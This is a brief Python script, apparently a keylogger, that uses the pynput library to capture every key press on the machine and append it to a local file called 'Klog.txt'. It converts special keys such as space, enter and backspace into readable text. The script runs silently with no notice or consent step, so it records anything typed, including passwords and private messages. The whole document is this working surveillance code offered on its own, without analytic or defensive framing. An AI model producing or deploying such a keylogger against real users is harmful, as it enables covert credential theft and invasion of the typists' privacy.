from pynput.keyboard import Listener

def Write(key):
    letter = str(key)
    letter = letter.replace("'", "")

    if letter == 'Key.space':
        letter = ' '
    if letter == 'Key.shift_r':
        letter = ''
    if letter == "Key.ctrl":
        letter = " Ctrl "
    if letter == "Key.enter":
        letter = "\n"
    if letter == "Key.backspace":
        letter = " <= del "

    with open("Klog.txt", 'a') as f:
        f.write(letter)


with Listener(on_press=Write) as l:
    l.join()

